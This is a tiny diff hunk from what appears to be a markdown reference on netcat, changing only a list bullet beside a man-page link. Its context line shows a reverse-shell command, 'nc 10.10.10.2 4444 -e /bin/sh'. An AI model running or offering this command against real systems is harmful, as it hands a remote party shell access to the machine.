@@ -125,4 +125,4 @@ nc 10.10.10.2 4444 -e /bin/sh
 
 ### URL list
 
-- [Linux.die.net](https://linux.die.net/man/1/nc)
+* [Linux.die.net](https://linux.die.net/man/1/nc)
